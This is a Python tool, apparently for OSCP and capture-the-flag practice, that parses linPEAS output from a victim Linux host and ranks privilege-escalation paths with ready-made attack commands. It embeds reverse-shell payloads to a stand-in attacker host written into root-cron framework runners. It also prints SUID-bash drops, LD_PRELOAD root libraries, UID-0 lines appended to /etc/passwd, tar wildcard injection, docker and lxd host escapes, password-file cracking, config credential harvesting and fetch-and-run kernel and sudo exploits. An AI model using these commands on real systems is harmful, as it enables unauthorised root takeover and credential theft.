#!/usr/bin/env python3
###############################################################################
#  lin_triage.py  —  GOD MODE v3  —  linPEAS output → ranked privesc + how-to
#
#  v3 fixes: (1) no more webroot false-positive explosion (www-data owning its
#  own app tree is NOT privesc), (2) never inject shell into .php, (3) correct
#  sudo-version parse, (4) credential-reuse detection cross-referenced with
#  shell users and sudo-group members (the real Lavita-style path).
#
#  USAGE
#     ./linpeas.sh -a 2>/dev/null > peas.txt     # on victim
#     python3 lin_triage.py peas.txt             # on Kali
#     cat peas.txt | python3 lin_triage.py -
#     python3 lin_triage.py peas.txt -v          # show low-confidence too
###############################################################################
import sys, re, argparse

class C:
    R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'
    CY='\033[96m'; BOLD='\033[1m'; DIM='\033[2m'; E='\033[0m'
def c(t,col,on): return f"{col}{t}{C.E}" if on else t

SUID_STOCK={'ssh-keysign','polkit-agent-helper-1','chsh','chfn','fusermount',
 'fusermount3','newgrp','umount','mount','gpasswd','dbus-daemon-launch-helper',
 'passwd','su','ntfs-3g','vmware-user-suid-wrapper','pkexec','sudo','at',
 'snap-confine','Xorg.wrap','pppd'}
SGID_STOCK={'unix_chkpwd','write','write.ul','chage','dotlockfile','crontab',
 'ssh-agent','wall','expiry','bsd-write','mlocate','ssh-keygen','utempter','postdrop'}
GTFO_SUID={'nmap','vim','vim.basic','rvim','view','find','bash','sh','more','less',
 'nano','cp','mv','awk','gawk','mawk','perl','python','python2','python3','ruby',
 'php','env','tar','zip','ed','man','socat','wget','curl','base64','dd','systemctl',
 'openssl','rsync','xxd','nohup','tee','sed','pico','make','node','lua','flock',
 'ionice','gdb','emacs','git','busybox','strace','ltrace','tclsh','expect','date','taskset'}
GTFO_SUDO=GTFO_SUID|{'apt','apt-get','dpkg','vi','ssh','mysql','tcpdump','ftp',
 'journalctl','service','scp','sftp','ansible-playbook','pip','pip3','cmake','snap','wall'}
# framework/app subdirs → writable here just means "you own your webapp", not privesc
APP_NOISE_DIRS=('/vendor/','/app/','/resources/','/routes/','/config/','/database/',
 '/tests/','/bootstrap/','/storage/','/public/','/node_modules/','/wp-content/',
 '/wp-includes/','/administrator/','/components/','/modules/','/lib/','/src/')

def load(p):
    d=sys.stdin.read() if p=='-' else open(p,errors='replace').read()
    return re.sub(r'\x1b\[[0-9;?]*[A-Za-z]','',d)

def sect(t,name):
    m=re.search(re.escape(name)+r'.*?(?=\n *╔|\Z)',t,re.S)
    return m.group(0) if m else ''

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('file'); ap.add_argument('--no-color',action='store_true')
    ap.add_argument('-v','--verbose',action='store_true')
    a=ap.parse_args()
    on=sys.stdout.isatty() and not a.no_color
    t=load(a.file)
    F=[]
    def add(s,ti,why,cmds): F.append((s,ti,why,cmds if isinstance(cmds,list) else [cmds]))

    # context
    mu=re.search(r'uid=\d+\(([^)]+)\)[^\n]*groups=([^\n]+)',t)
    user=mu.group(1) if mu else 'user'; mygroups=mu.group(2) if mu else ''
    mk=re.search(r'Linux \S+ (\d+\.\d+\.\d+)',t); kern=mk.group(1) if mk else '?'
    ms=re.search(r'Sudo version\s+(\d+\.\d+\S*)',t); sudov=ms.group(1) if ms else ''

    # gather other users: shell users + who's in sudo/admin group
    shell_users=set(re.findall(r'^([a-z_][a-z0-9_-]*):x?:\d+:\d+.*:/bin/(?:bash|sh|zsh)',
                               sect(t,'Users with console'),re.M))
    shell_users|=set(re.findall(r'([a-z_][a-z0-9_-]*):x:\d+:\d+[^\n]*/bin/(?:bash|sh|zsh)',t))
    shell_users.discard('root')
    sudo_users=set()
    for m in re.finditer(r'uid=\d+\(([^)]+)\)[^\n]*groups=([^\n]+)',t):
        if re.search(r'\b(27\(sudo\)|sudo|wheel|admin)\b',m.group(2)) and m.group(1)!=user:
            sudo_users.add(m.group(1))

    # ══ SUDO -l ══
    ss=sect(t,'sudo -l')+sect(t,"'sudo -l'")+sect(t,'sudoers')
    if re.search(r'\(ALL(\s*:\s*ALL)?\)\s*(NOPASSWD:\s*)?ALL',ss):
        add(100,'sudo ALL','You can run anything as root.',['sudo su -'])
    for m in re.finditer(r'\(([^)]*)\)\s*(NOPASSWD:\s*)?(/[^\s,]+)',ss):
        runas,nopw,binp=m.group(1),m.group(2),m.group(3); nm=binp.rsplit('/',1)[-1]
        why=f'sudo runs {nm} as {runas or "root"}'+(' NOPASSWD' if nopw else '')+'.'
        if nm in GTFO_SUDO:
            add(97,f'sudo {binp} → GTFOBins',why+' GTFOBins → root shell.',
                [f'sudo {binp}  # GTFOBins "{nm}" sudo escape'])
        else:
            add(84,f'sudo {binp} (custom)',why+' Inspect for PATH/relative-command hijack.',
                [f'cat {binp}',f'echo -e "#!/bin/bash\\nchmod +s /bin/bash">/tmp/CMD;chmod +x /tmp/CMD;PATH=/tmp:$PATH sudo {binp};/bin/bash -p'])
    if re.search(r'env_keep.*LD_PRELOAD',ss):
        add(95,'sudo env_keep+=LD_PRELOAD','LD_PRELOAD survives sudo → load malicious .so as root.',
            ['gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c  # x.c: _init(){setuid(0);system("/bin/bash");}',
             'sudo LD_PRELOAD=/tmp/x.so <allowed-binary>'])
    if sudov and re.match(r'1\.(8\.(2[0-9]|3[01])|9\.[0-4]|9\.5p1)',sudov):
        add(80,f'sudo {sudov} → Baron Samedit (CVE-2021-3156)','sudo <1.9.5p2 heap overflow → root.',
            ['git clone https://github.com/blasty/CVE-2021-3156;cd CVE-2021-3156;make;./sudo-hax-me-a-sandwich'])

    # ══ CREDENTIAL REUSE (the big one for webapp boxes) ══
    # track provenance: {password: (line_no, source_line)} so we say WHERE it came from
    lines=t.split('\n')
    # map each line index to the nearest preceding linpeas section header
    creds={}   # value -> (lineno, section, rawline)
    cur_sec='(unknown section)'
    for i,ln in enumerate(lines,1):
        hs=re.search(r'╣\s*(.+?)\s*(?:\(T\d|╠|$)',ln)
        if hs and '╣' in ln: cur_sec=hs.group(1).strip()
        for m in re.finditer(r'(?i)\b(?:DB_PASSWORD|MYSQL_PASSWORD|REDIS_PASSWORD|password|passwd)\b\s*[:=]>?\s*[\'"]?([^\s\'",()<>]{4,60})',ln):
            v=m.group(1)
            # reject non-secret junk: paths, env-var refs, placeholders, all-lowercase dict words
            if (v.lower() in('null','true','false','forge','secret','env','files','none','yes','no')
                    or v.startswith(('$','/','{','<'))
                    or 'env(' in ln.lower()
                    or re.match(r'^[A-Z_]+$',v)          # e.g. PASSWORD, ENABLED (env names)
                    or '/' in v):                        # paths like /tmp
                continue
            if v not in creds:
                creds[v]=(i,cur_sec,ln.strip()[:100])
    if creds:
        cl=sorted(creds)
        targets=sorted(shell_users) or ['root']
        sc=93 if (shell_users & sudo_users) or sudo_users else 88
        # if a framework runner (artisan/bin/console/manage.py) is writable, THAT is
        # the stronger, near-certain path — demote creds (which are only a hypothesis)
        _wf=sect(t,'Interesting writable files')+sect(t,'GROUP writable')
        if re.search(r'/(artisan|bin/console|manage\.py|bin/rails)\s*$',_wf,re.M):
            sc=min(sc,74)
        note=''
        if sudo_users: note=f' Users {", ".join(sorted(sudo_users))} are in the sudo group → after su, run sudo su.'
        # provenance lines: password → where it was found
        prov=[f'# found "{v}"  @ line {creds[v][0]} in [{creds[v][1]}]:' for v in cl]
        prov+=[f'#   {creds[v][2]}' for v in cl]
        add(sc,'Credential reuse from config/.env',
            f'Password(s) found: {", ".join(cl)} (see source lines below). '
            f'Reuse against every real user (esp. {", ".join(targets)}) via su/ssh.'+note,
            prov+
            [f'su {u}   # try each: {" / ".join(cl)}' for u in targets[:4]]+
            (['# once in as a sudo-group user:','sudo -l && sudo su -'] if sudo_users else
             ['# then check: sudo -l ; and mysql -u <dbuser> -p with the same pass']))

    # ══ SUID ══
    for m in re.finditer(r'-rws[rwx-]+\s+\d+\s+\S+\s+\S+\s+\S+.*?\s(/\S+)',sect(t,'SUID')):
        p=m.group(1); nm=p.rsplit('/',1)[-1]
        if nm=='pkexec' and 'CVE-2021-4034' in t:
            add(82,'SUID pkexec → PwnKit (CVE-2021-4034)','pkexec SUID → 2021 local root.',
                ['git clone https://github.com/ly4k/PwnKit && ./PwnKit/PwnKit']); continue
        if nm in SUID_STOCK: continue
        if nm in GTFO_SUID:
            add(93,f'SUID {p} → GTFOBins',f'{nm} SUID-root → direct root.',
                [f'# GTFOBins "{nm}" SUID: e.g. find: {p} . -exec /bin/sh -p \\; -quit ; bash: {p} -p'])
        else:
            add(72,f'SUID {p} (custom)',f'{nm} SUID-root, non-standard → likely intended. Reverse it.',
                [f'strings {p}; ltrace -f {p} 2>&1|grep -i exec',
                 f'# bare command inside → PATH hijack; dlopen .so from writable dir → LD hijack'])

    # ══ SGID ══
    for m in re.finditer(r'-rwx[r-]s[rwx-]+.*?\s(/\S+)',sect(t,'SGID')):
        nm=m.group(1).rsplit('/',1)[-1]
        if nm not in SGID_STOCK and nm not in SUID_STOCK:
            add(64,f'SGID {m.group(1)}',f'{nm} runs with its group — abuse if group owns sensitive files.',
                [f'# GTFOBins "{nm}" (group-priv, e.g. shadow → read /etc/shadow)'])

    # ══ capabilities ══
    for m in re.finditer(r'(/\S+)\s+cap_[\w,]*setuid[\w,]*[=+]ep',t):
        b=m.group(1); nm=b.rsplit('/',1)[-1]
        pay={'python':f'{b} -c \'import os;os.setuid(0);os.system("/bin/sh")\'',
             'python3':f'{b} -c \'import os;os.setuid(0);os.system("/bin/sh")\'',
             'perl':f'{b} -e \'use POSIX;setuid(0);exec "/bin/sh";\'',
             'ruby':f'{b} -e \'Process::Sys.setuid(0);exec "/bin/sh"\''}.get(nm,f'# {nm}: setuid(0) then exec shell')
        add(92,f'cap_setuid on {b}',f'{nm} has cap_setuid → uid 0 without SUID.',[pay])

    # ══ FRAMEWORK SCHEDULER writable (Laravel/Symfony/Django/Rails...) ══
    # Pattern: a framework "runner" is executed by a ROOT cron (e.g. Laravel's
    #   * * * * * root php /app/artisan schedule:run
    # If www-data can write that runner (it owns the webapp), overwriting it =
    # root runs YOUR code on the next cron tick. This is a top-tier OSCP vector.
    wfiles=sect(t,'Interesting writable files')+sect(t,'GROUP writable')+ \
           sect(t,'writable files')+t   # also scan whole output for the path
    FRAMEWORKS=[
      # (name, runner-file regex, root-cron cmd, malicious payload written to runner)
      ('Laravel', r'(/\S*/artisan)\b', 'php artisan schedule:run',
       '<?php system($_SERVER["SHELL_CMD"] ?? "bash -c \'bash -i >& /dev/tcp/KALI/4444 0>&1\'"); ?>'),
      ('Symfony', r'(/\S*/bin/console)\b', 'php bin/console (cron)',
       '<?php system("bash -c \'bash -i >& /dev/tcp/KALI/4444 0>&1\'"); ?>'),
      ('Django',  r'(/\S*/manage\.py)\b', 'python manage.py <cmd> (cron)',
       'import os;os.system("bash -c \'bash -i >& /dev/tcp/KALI/4444 0>&1\'")'),
      ('Rails',   r'(/\S*/bin/rails)\b', 'rails runner / rake (cron)',
       'system("bash -c \'bash -i >& /dev/tcp/KALI/4444 0>&1\'")'),
    ]
    fw_hit=set()
    for fwname,rx,croncmd,payload in FRAMEWORKS:
        for m in re.finditer(rx,wfiles):
            runner=m.group(1)
            if runner in fw_hit: continue
            # is the runner (or its Console/Kernel) actually writable by us?
            wr=re.search(re.escape(runner)+r'\s*$',
                         sect(t,'Interesting writable files')+sect(t,'GROUP writable'),re.M)
            kernel_wr='Console/Kernel.php' in wfiles and fwname=='Laravel'
            if not (wr or kernel_wr):
                continue
            fw_hit.add(runner)
            appdir=runner.rsplit('/',1)[0]
            add(92,f'{fwname} scheduler writable → root cron ({runner})',
                f'{fwname} apps are driven by a root cron running "{croncmd}". Since {user} can write '
                f'{runner}, overwriting it means ROOT executes your code on the next tick (usually every minute). '
                f'This is why the file being writable — not any password — is the real path to root.',
                [f'cd {appdir}',
                 f'mv artisan artisan.bak    # (Laravel) keep the original' if fwname=='Laravel' else f'cp {runner} {runner}.bak',
                 '# Kali: nc -nlvp 4444',
                 f'echo \'{payload.replace("KALI","$KALI_IP")}\' > {runner}',
                 '# wait 1-2 min for the root cron → you get a ROOT shell on your listener',
                 f'# CONFIRM the cron exists first: ./pspy64  (look for UID=0 running "{croncmd}")'])

    # ══ WRITABLE SCRIPTS — collapse webapp tree, never inject .php ══
    wsec=sect(t,'Interesting writable files')+sect(t,'GROUP writable')
    writable=re.findall(r'^(/\S+\.(?:sh|py|pl|rb|php))\s*$',wsec,re.M)
    real_scripts=[]; app_writable=0
    for p in writable:
        if 'linpeas' in p or '/tmp/' in p and p.endswith(('.sh','.py')) and 'linpeas' in p:
            continue
        in_app = any(d in p for d in APP_NOISE_DIRS) or p.endswith('.php')
        if in_app:
            app_writable+=1
        else:
            real_scripts.append(p)
    # genuine standalone scripts (.sh/.py/.pl/.rb outside the app tree)
    for p in real_scripts:
        nm=p.rsplit('/',1)[-1]
        hot=bool(re.search(r'clean|backup|cron|run|update|check|monitor|health|report',nm,re.I))
        add(95 if hot else 78,f'Writable script: {p}',
            f'{user} can write it, and it lives outside a framework tree. '+
            ('Name suggests a root cron.' if hot else 'Root vector IF a cron/service runs it — confirm with pspy.'),
            [f'echo "chmod +s /bin/bash" >> {p}   # only works if root runs it as a shell script',
             '/bin/bash -p','# CONFIRM the runner first: ./pspy64  (look for UID=0 exec of it)'])
    if app_writable and not fw_hit:
        add(35,f'Web app tree writable by {user} ({app_writable} files)',
            f'Expected: {user} owns its webapp, so every file shows as writable. NOT a privesc alone. '
            'Two real paths hide here: (1) a FRAMEWORK RUNNER (artisan/bin/console/manage.py) run by a root '
            'cron — overwrite it for root; (2) CREDENTIAL REUSE from configs/.env. Find the cron with pspy.',
            ['ls -la artisan bin/console manage.py 2>/dev/null   # framework runner writable? → root cron vector',
             './pspy64   # watch for UID=0 executing anything under the webroot'])

    # ══ writable cron / systemd ══
    cs=sect(t,'Cron jobs')+sect(t,'vulnerable cron')
    for m in re.finditer(r'\*.*\broot\b\s+(?:cd \S+ && )?(/\S+\.(?:sh|py|pl))',cs):
        add(90,f'Root cron script {m.group(1)}',f'Cron runs {m.group(1)} as root — check writability/PATH/wildcard.',
            [f'ls -la {m.group(1)}'])
    if re.search(r'tar .*\*|--checkpoint',cs,re.I):
        add(85,'Cron tar/wildcard injection','Root cron tar over a dir you control → --checkpoint-action RCE.',
            ['echo "chmod +s /bin/bash">shell.sh;touch -- "--checkpoint=1";touch -- "--checkpoint-action=exec=sh shell.sh"'])
    if re.search(r'(/etc/systemd/system|writable).*(service|timer).*writable|can write.*\.service',t):
        add(89,'Writable systemd unit','Override ExecStart to run payload as root, restart/wait timer.',
            ['ExecStart=/bin/bash -c "chmod +s /bin/bash"','systemctl restart <unit>;/bin/bash -p'])

    # ══ dangerous groups (MINE) ══
    gmap={'docker':(94,'docker group == root.',['docker run -v /:/mnt --rm -it alpine chroot /mnt sh']),
     'lxd':(94,'lxd → mount host / as root.',['lxc init img r -c security.privileged=true;lxc config device add r h disk source=/ path=/mnt recursive=true;lxc start r;lxc exec r sh']),
     'lxc':(94,'lxc → mount host /.',['# see lxd technique']),
     'disk':(88,'disk → raw /dev/sda → read any file.',['debugfs /dev/sda1  # cat /etc/shadow']),
     'shadow':(80,'shadow → read /etc/shadow.',['cat /etc/shadow>/tmp/s;unshadow /etc/passwd /tmp/s>h;john h']),
     'adm':(50,'adm → read /var/log for creds.',['grep -riE "pass|token" /var/log 2>/dev/null'])}
    for g,(sc,why,cmd) in gmap.items():
        if re.search(rf'\b{g}\b',mygroups): add(sc,f'Your group: {g}',why,cmd)

    # ══ passwd/shadow/sudoers ══
    if re.search(r'Writable passwd file[.\s]*Yes',t):
        add(97,'/etc/passwd writable','Append UID-0 user → su root.',
            ['echo "r00t:$(openssl passwd -1 pass):0:0::/root:/bin/bash">>/etc/passwd;su r00t'])
    if re.search(r'Can I read shadow files[.\s]*(?!.*No)Yes',t):
        add(85,'/etc/shadow readable','unshadow+john → crack root.',['unshadow /etc/passwd /etc/shadow>h;john h'])

    # ══ NFS ══
    if 'no_root_squash' in t:
        add(90,'NFS no_root_squash','Mount export as root from Kali, drop SUID bash.',
            ['mount -t nfs TARGET:/share /mnt;cp /bin/bash /mnt/rb;chmod +s /mnt/rb','# target: /share/rb -p'])

    # ══ ld.so.preload / sudo tokens ══
    if re.search(r'/etc/ld\.so\.preload.*writable|writable.*ld\.so\.preload',t):
        add(88,'/etc/ld.so.preload writable','Preload .so into every root exec.',['echo /tmp/x.so>/etc/ld.so.preload'])

    # ══ kernel ══
    if kern!='?':
        if 'CVE-2022-0847' in t or 'DirtyPipe' in t:
            add(78,'Kernel: DirtyPipe (CVE-2022-0847)',f'{kern} in 5.8–5.16.11 → reliable local root.',
                ['git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits;cd *DirtyPipe*;make;./exploit-1'])
        if 'CVE-2021-4034' in t and not any('PwnKit' in x[1] for x in F):
            add(80,'PwnKit (CVE-2021-4034)','pkexec local root.',['./PwnKit'])
        if 'CVE-2016-5195' in t:
            add(74,'Kernel: DirtyCOW','pre-4.8.3 → root.',['gcc -pthread dirty.c -o d -lcrypt;./d'])

    # ══ SSH keys ══
    if re.search(r'BEGIN (?:RSA|OPENSSH|EC|DSA) PRIVATE KEY',t):
        add(60,'Private SSH key found','Try it against root/other users.',['chmod 600 key;ssh -i key USER@TARGET'])

    # ══ APP CREDENTIAL STORES (service configs / embedded DBs with creds) ══
    # Many boxes stash service passwords in app config/DB files the service user
    # can read. Those passwords are then reused for root/SSH. This detects the
    # store's presence in the output and, if PermitRootLogin yes, says "extract
    # and try for root". Pattern beats memorising each app.
    rootlogin = bool(re.search(r'PermitRootLogin\s+yes',t))
    APP_STORES=[
      # (name, path-regex that appears in linpeas output, extraction cmd, note)
      ('OpenFire', r'/var/lib/openfire/embedded-db|/etc/openfire/openfire\.xml',
       "grep -iE 'passwordKey|encryptedPassword|OFUSER' /var/lib/openfire/embedded-db/openfire.script",
       'Blowfish-encrypted admin pass + passwordKey → decrypt (github MattiaCossu/Openfire-Password-Decryptor), reuse for root.'),
      ('Tomcat', r'tomcat-users\.xml|/etc/tomcat\d*/',
       "grep -iE 'password|role' $(find / -name tomcat-users.xml 2>/dev/null)",
       'Cleartext manager creds → reuse for SSH/su.'),
      ('Jenkins', r'/var/lib/jenkins|secrets/master\.key|credentials\.xml',
       "cat /var/lib/jenkins/credentials.xml; cat /var/lib/jenkins/secrets/master.key",
       'Decrypt with the master.key+hudson.util.Secret → reuse.'),
      ('WordPress', r'wp-config\.php',
       "grep -iE 'DB_PASSWORD|DB_USER' $(find / -name wp-config.php 2>/dev/null)",
       'DB creds → mysql users table / reuse for SSH.'),
      ('Joomla', r'configuration\.php.*Joomla|/joomla/',
       "grep -iE 'public \\$password|public \\$user' $(find / -name configuration.php 2>/dev/null)",
       'DB creds in configuration.php → reuse.'),
      ('Drupal', r'sites/default/settings\.php',
       "grep -iE \"'database'|'password'|'username'\" $(find / -name settings.php 2>/dev/null)",
       'DB creds → reuse.'),
      ('Moodle', r'/moodle/config\.php|CFG->dbpass',
       "grep -iE 'dbpass|dbuser' $(find / -name config.php 2>/dev/null | grep -i moodle)",
       'DB creds → reuse.'),
      ('phpMyAdmin', r'config\.inc\.php|phpmyadmin',
       "grep -iE \"password|controluser\" $(find / -name config.inc.php 2>/dev/null)",
       'Stored MySQL creds → reuse.'),
    ]
    for name,rx,extract,note in APP_STORES:
        if re.search(rx,t):
            sc = 82 if rootlogin else 74
            why=(f'{name} stores credentials in its config/DB that {user} can read. '
                 f'Extract them — service passwords are very often reused for the root or an SSH user. '
                 + (f'sshd has PermitRootLogin yes, so a recovered password can be tried directly against root over SSH. ' if rootlogin else '')
                 + note)
            cmds=[extract]
            if rootlogin:
                cmds.append('ssh root@TARGET      # try every recovered password')
            cmds.append('# also try: su root  /  su <otheruser>  with each recovered password')
            add(sc,f'{name} credential store readable → reuse for root',why,cmds)

    # ── OUTPUT ──
    hdr=f"╔═ lin_triage v3 ═ user={user}  kernel={kern}"+(f"  sudo={sudov}" if sudov else "")
    print(c("\n"+hdr,C.BOLD+C.CY,on))
    if mygroups: print(c("║  groups: "+mygroups[:110],C.DIM,on))
    if shell_users: print(c("║  other shell users: "+", ".join(sorted(shell_users))+
                            (f"  (in sudo: {', '.join(sorted(sudo_users))})" if sudo_users else ""),C.DIM,on))
    print(c("╚"+"═"*58,C.DIM,on))
    if not F:
        print(c("\n[!] No strong vector. Check pspy, sudo -l, getcap -r /, GTFOBins manually.",C.Y,on)); return
    F.sort(key=lambda x:-x[0]); seen=set(); rank=1
    for s,ti,why,cmds in F:
        if ti in seen: continue
        seen.add(ti)
        if s<50 and not a.verbose: continue
        cc=C.R if s>=90 else C.Y if s>=72 else C.B
        print(f"\n{c(f'[{rank}] ({s}/100) {ti}',cc+C.BOLD,on)}")
        print(f"    {c('WHY ',C.DIM,on)}{why}")
        for cmd in cmds: print(f"    {c('$',C.G,on)} {cmd}")
        rank+=1
    print(c(f"\n[+] ATTACK FIRST → {F[0][1]}",C.G+C.BOLD,on))
    print(c(f"    {F[0][3][0]}",C.G,on))
    if not a.verbose and any(x[0]<50 for x in F):
        print(c("\n[i] low-confidence leads hidden — -v to show.",C.DIM,on))

if __name__=='__main__': main()
